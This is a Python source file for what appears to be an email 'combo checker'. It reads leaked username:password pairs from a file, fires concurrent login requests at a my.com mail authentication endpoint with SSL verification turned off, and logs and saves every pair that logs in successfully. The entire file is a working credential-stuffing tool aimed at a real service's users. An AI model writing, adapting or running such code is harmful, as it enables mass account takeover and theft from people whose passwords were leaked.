from EmailChecker.api.Combo import (ComboWriter, ComboReader)

from aiohttp import ClientSession, TCPConnector
import asyncio, logging
from colorama import init, Fore, Back, Style
init()

URL = "https://aj-https.my.com/cgi-bin/auth?model=&simple=1"

class Api:
    def __init__(self, combo_path="combos/combo.txt", log=True):
        self.credentials = ComboReader().read(combo_path)
        self.session = ClientSession(connector=TCPConnector(verify_ssl=False))
        self.cw = ComboWriter()

    async def login(self, user, pwd):
        data = {"Login": user, "Password": pwd}
        async with self.session.post(URL, data=data) as response:
            response = await response.read()
            if b'Ok=1' == response:
                self.cw.success(user, pwd) # Save success to file
                print(Fore.LIGHTGREEN_EX + '[VALID] ' + user + ':' + pwd + '')
                return True
            print(Fore.LIGHTRED_EX + '[INVALID] ' + user + ':' + pwd + '')
            return False

    async def start(self):
        tasks = []
        for user, pwd in self.credentials.items():
            task = asyncio.ensure_future(self.login(user, pwd))
            tasks.append(task)

        res = await asyncio.gather(*tasks)
        print(Style.RESET_ALL)
        print("Success: ", sum(res))
        print("Fails: ", len(res)-sum(res))

        logging.info("Closing connector..")
        await self.session.close()
        print("Done.")
    

    
